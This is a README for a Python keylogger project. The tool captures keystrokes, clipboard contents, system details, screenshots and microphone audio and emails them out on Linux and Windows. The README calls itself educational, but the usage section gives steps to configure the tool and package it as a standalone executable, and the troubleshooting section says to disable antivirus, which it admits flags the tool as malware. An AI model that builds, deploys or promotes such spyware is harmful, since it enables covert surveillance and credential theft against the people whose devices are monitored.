# Keylogger

This is an educational project on how to make a keylogger, understand how it works, and extend its functionality as desired. It has **NOT** been developed with the intention of violating anyone's security or privacy.

A keylogger is a software that intercepts and saves the keystrokes made on the computer on which it is active. This is usually used by cybercriminals to get user credentials, but it is also used by some companies to control its employees.

Specifically in this project we have created a basic keylogger that records the keystrokes of a computer, stores them temporarily on the computer to later be sent by mail to the desired email address. It works for both Linux and Windows.

Additionally, functionality has been added to record and send the following information:
- Computer clipboard content at the time of registration.
- System information (Public IP, system characteristics, etc.)
- Screenshot at the time of registration.
- Microphone recording (if available) for as long as desired after registration.

_Disclaimer_: I am not responsible for the misuse of this software, however I warn that this software is detected as malware by most antivirus. Feel free to make any modification, improvement or proposal to change the project code.

## Usage

- Clone the repo with `$ git clone https://github.com/alopezj97/Keylogger.git`.
- Make sure you have installed python (I used python3) and pip (pythonenv, python3-dev).
- Build a virtual environment with `python3 -m venv venv`.
- Activate your virtual environment with `. venv/bin/activate`.
- Install all the dependencies with `pip3 install -r requirements.txt`.
- Modify the configuration in `config/keylogger_config.py` and set it up with the desired values.
- Run it with `python src/keylogger.py`. Try typing somewhere while talking for the time you set in the configuration and then check your email address.
- (Optional) We can make it an executable with `python -m PyInstaller src/keylogger.py --onefile`. If it fails for you try adding:
    - `--hidden-import=pynput.keyboard._xorg --hidden-import=pynput.mouse._xorg` in Linux. And then execute it with `$ ./keylogger`.
    - `--hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32` in Windows. And then execute it with `$ keylogger`

## Troubleshooting

- Make sure you have all the dependencies installed.
- Make sure you allow less secure apps in your gmail account in order to be able to log in and send emails, check this [link](https://support.google.com/a/answer/6260879?hl=en) for more info.
- Disable any interfiering antivirus.
- Make sure you have the rights to execute the file for the optional step.
- Please contact me for any additional problem.
